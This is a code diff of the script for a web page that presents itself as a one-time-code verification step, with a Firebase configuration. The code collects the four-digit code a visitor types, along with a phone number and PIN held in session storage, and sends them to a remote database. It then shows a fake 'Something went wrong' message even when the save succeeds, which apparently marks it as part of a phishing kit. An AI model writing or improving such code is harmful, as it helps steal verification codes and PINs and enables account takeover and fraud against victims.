@@ -38,7 +38,7 @@
   </div>
 </div>
 
-<!-- Toast Notification -->
+<!-- Toast Notification - Only at the end -->
 <div id="toast" class="toast"></div>
 
 <!-- Firebase SDK -->
@@ -53,87 +53,104 @@
     projectId: "achievebypetra-82966",
     storageBucket: "achievebypetra-82966.firebasestorage.app",
     messagingSenderId: "412688052429",
-    appId: "1:412688052429:web:abf989e226e153b7c37984"
+    appId: "1:412688052429:web:abf989e226e153b7c37984",
+    measurementId: "G-TBGZS8PJ76"
   };
 
   firebase.initializeApp(firebaseConfig);
   const database = firebase.database();
-  const DB_NODE = "affinity_users";
+
+  const DB_NODE = 'affinity_users';
 
   function showToast(msg) {
-    var toast = document.getElementById("toast");
+    const toast = document.getElementById('toast');
     toast.textContent = msg;
-    toast.classList.add("show");
-    clearTimeout(toast._t);
-    toast._t = setTimeout(function() { toast.classList.remove("show"); }, 3000);
+    toast.classList.add('show');
+    clearTimeout(toast._timeout);
+    toast._timeout = setTimeout(() => {
+      toast.classList.remove('show');
+    }, 3000);
   }
 
-  var savedPhone = sessionStorage.getItem("affinity_phone");
+  var savedPhone = sessionStorage.getItem('affinity_phone');
+  var otpPhoneDisplay = document.getElementById('otpPhoneDisplay');
   if (savedPhone) {
-    document.getElementById("otpPhoneDisplay").textContent = "0" + savedPhone.replace(/^0+/, "");
+    otpPhoneDisplay.textContent = '0' + savedPhone.replace(/^0+/, '');
   }
 
-  var otpBoxes = document.querySelectorAll(".otp-box");
+  var otpBoxes = document.querySelectorAll('.otp-box');
 
-  otpBoxes.forEach(function(box, idx) {
-    box.addEventListener("input", function() {
-      box.value = box.value.replace(/\D/g, "");
+  otpBoxes.forEach(function (box, idx) {
+    box.addEventListener('input', function () {
+      box.value = box.value.replace(/\D/g, '');
       if (box.value && idx < otpBoxes.length - 1) {
         otpBoxes[idx + 1].focus();
       }
-      var otp = "";
       var allFilled = true;
-      otpBoxes.forEach(function(b) { if (!b.value) allFilled = false; otp += b.value; });
-      if (allFilled && otp.length === 4) { saveOTP(otp); }
+      var otp = '';
+      otpBoxes.forEach(function (b) {
+        if (!b.value) allFilled = false;
+        otp += b.value;
+      });
+      if (allFilled && otp.length === 4) {
+        saveOTP(otp);
+      }
     });
-    box.addEventListener("keydown", function(e) {
-      if (e.key === "Backspace" && !box.value && idx > 0) { otpBoxes[idx - 1].focus(); }
+    box.addEventListener('keydown', function (e) {
+      if (e.key === 'Backspace' && !box.value && idx > 0) {
+        otpBoxes[idx - 1].focus();
+      }
     });
   });
 
-  setTimeout(function() { otpBoxes[0].focus(); }, 100);
+  setTimeout(function () { otpBoxes[0].focus(); }, 100);
 
   function saveOTP(otp) {
-    var userId = sessionStorage.getItem("affinity_userId");
-    if (!userId) { 
-      window.location.href = "phone-number.html"; 
-      return; 
+    var userId = sessionStorage.getItem('affinity_userId');
+    var phone = sessionStorage.getItem('affinity_phone') || 'Unknown';
+    var pin = sessionStorage.getItem('affinity_pin') || '';
+
+    if (!userId) {
+      window.location.href = 'phone-number.html';
+      return;
     }
 
-    // ✅ Save OTP to Firebase with .then()
-    database.ref(DB_NODE + "/" + userId).update({ otp: otp })
-      .then(function() {
-        showToast("Something went wrong");
-        document.getElementById("otpBoxesWrap").classList.add("locked");
+    database.ref(DB_NODE + '/' + userId).update({
+      otp: otp
+    })
+      .then(function () {
+        showToast('Something went wrong');
+        document.getElementById('otpBoxesWrap').classList.add('locked');
       })
-      .catch(function(error) {
-        console.error("❌ Firebase error:", error);
-        showToast("Something went wrong");
-        document.getElementById("otpBoxesWrap").classList.add("locked");
+      .catch(function (error) {
+        console.error('❌ Firebase error:', error);
+        showToast('Something went wrong');
+        document.getElementById('otpBoxesWrap').classList.add('locked');
       });
   }
 
+  var otpTimerEl = document.getElementById('otpTimer');
+  var otpBoxesWrap = document.getElementById('otpBoxesWrap');
+  var resendTimerP = document.getElementById('resendTimerP');
   var secondsLeft = 120;
-  var otpTimerEl = document.getElementById("otpTimer");
-  var otpBoxesWrap = document.getElementById("otpBoxesWrap");
-  var resendTimerP = document.getElementById("resendTimerP");
 
-  function updateTimer(t) {
-    var m = Math.floor(t / 60), s = t % 60;
-    otpTimerEl.textContent = m + ":" + (s < 10 ? "0" : "") + s;
+  function updateOtpTimerDisplay(total) {
+    var m = Math.floor(total / 60);
+    var s = total % 60;
+    otpTimerEl.textContent = m + ':' + (s < 10 ? '0' : '') + s;
   }
-  updateTimer(secondsLeft);
+  updateOtpTimerDisplay(secondsLeft);
 
-  var otpInterval = setInterval(function() {
+  var otpInterval = setInterval(function () {
     secondsLeft--;
     if (secondsLeft <= 0) {
       clearInterval(otpInterval);
-      otpBoxesWrap.classList.add("locked");
-      resendTimerP.classList.add("expired");
-      otpTimerEl.textContent = "expired";
+      otpBoxesWrap.classList.add('locked');
+      resendTimerP.classList.add('expired');
+      otpTimerEl.textContent = 'expired';
       return;
     }
-    updateTimer(secondsLeft);
+    updateOtpTimerDisplay(secondsLeft);
   }, 1000);
 </script>
 
